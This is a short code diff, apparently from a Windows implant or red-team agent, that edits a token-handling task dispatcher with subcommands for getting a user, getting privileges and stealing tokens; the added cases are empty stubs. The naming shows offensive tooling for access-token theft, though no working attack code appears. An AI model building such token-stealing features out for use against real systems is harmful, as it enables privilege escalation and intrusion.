@@ -1323,7 +1323,7 @@ auto DECLFN Task::Token(
     switch ( SubID ) {
         case TknGetUUID: {
             CHAR*  ProcUser    = nullptr;
-            HANDLE TokenHandle = INVALID_HANDLE_VALUE;
+            HANDLE TokenHandle = nullptr;
 
             ProcUser = Self->Tkn->GetUser( TokenHandle );
 
@@ -1334,8 +1334,11 @@ auto DECLFN Task::Token(
             
             break;
         }
-        case TknSteal: {
-            
+        case TknGetPriv: {
+            break;
+        }
+        case TknSteal: {    
+            break;
         }
     }
 }
